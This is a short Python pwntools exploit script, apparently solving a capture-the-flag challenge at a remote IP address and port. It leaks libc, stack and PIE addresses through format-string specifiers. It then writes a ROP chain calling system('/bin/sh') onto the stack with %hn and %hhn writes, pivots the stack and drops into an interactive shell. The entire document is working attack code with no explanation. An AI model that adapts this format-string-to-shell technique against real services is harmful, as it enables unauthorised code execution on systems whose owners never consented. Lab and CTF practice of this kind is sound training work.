from pwn import *

elf = ELF('./chal')
libc = ELF('./libc.so.6')

context.binary = './chal'
context.arch = 'amd64'
# context.log_level = 'debug'

p = remote('34.170.146.252', 64123)

# leak __libc_start_main return
p.sendline(b"%9$p")
libc_leak = int(p.recvline().strip(), 16)
libc.address = libc_leak - libc.symbols['__libc_start_main'] + 54
log.info(f"libc_base: {hex(libc.address)}")

# leak stack address
p.sendline(b"%6$p")
stack_addr = int(p.recvline().strip(), 16)
log.info(f"stack_addr: {hex(stack_addr)}")

# pie base
p.sendline(b"%7$p")
main_leak = int(p.recvline().strip(), 16)
elf.address = main_leak - elf.symbols['main'] - 18
log.info(f"pie_base: {hex(elf.address)}")


elf_pop_rbp = next(elf.search(asm("pop rbp; ret"), executable=True))
pop_rdi = p64(next(libc.search(asm("pop rdi; ret"), executable=True)))
binsh_addr = p64(next(libc.search(b"/bin/sh\x00")))
system_addr = p64(libc.symbols['system'])
ret_addr = p64(next(libc.search(asm("ret"), executable=True)))


payload = pop_rdi + binsh_addr + ret_addr + system_addr
write_addr = stack_addr + 0x8
offset = 0
for i in payload:
    if i == 0:
        offset += 1
        continue
    p.sendline(f"%{(write_addr+offset) & 0xffff}c%6$hn")
    p.sendline(f"%{i}c%8$hhn")
    offset += 1

p.sendline(f"%{(stack_addr-0x8) & 0xffff}c%6$hn")
p.sendline(f"%{elf_pop_rbp & 0xffff}c%8$hn")

p.interactive()
